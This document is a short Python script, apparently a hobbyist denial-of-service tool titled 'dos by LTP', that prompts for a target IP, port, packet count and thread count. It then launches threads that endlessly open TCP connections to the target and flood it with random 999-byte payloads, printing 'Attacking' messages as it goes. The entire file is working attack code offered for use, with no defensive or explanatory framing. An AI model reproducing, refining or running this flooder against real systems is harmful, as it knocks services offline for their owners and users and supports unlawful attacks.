import random
import threading
import socket
import os
import time

os.system('cls')
os.system('color 2')
print(r"""
  __                    
 /\ \                   
 \_\ \    ___     ____  
 /'_` \  / __`\  /',__\ 
/\ \L\ \/\ \L\ \/\__, `\
\ \___,_\ \____/\/\____/
 \/__,_ /\/___/  \/___/ 
                        
                 by LTP       
""")

ip = str(input("[+] IP: "))
port = int(input("[+] Port: "))
packet = int(input("[+] Packets: "))
thread = int(input("[+] Threads: "))
time.sleep(2)

os.system('cls')
print(r"""
  ___
 / _ \| | | |           | |  (_)                  
/ /_\ \ |_| |_ __ _  ___| | ___ _ __   __ _       
|  _  | __| __/ _` |/ __| |/ / | '_ \ / _` |      
| | | | |_| || (_| | (__|   <| | | | | (_| |   _   _   _ 
\_| |_/\__|\__\__,_|\___|_|\_\_|_| |_|\__, |  (_| (_| |_)
                                       __/ |      
                                      |___/
""")

time.sleep(1)
print("\n[+] Start attacking......")

def atk():
    message = random._urandom(999)
    step = 0
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(message)
            for i in range(packet):
                h.send(message)
            step += 1
            print('[+] Attacking ' + ip +'>>> Sent: ' + str(step))
        except KeyboardInterrupt:
            h.close()
            print("[+] Stopped by Keyboard Interrupt !!!!")
            pass

for b in range(thread):
    thread = threading.Thread(target=atk)
    thread.start()
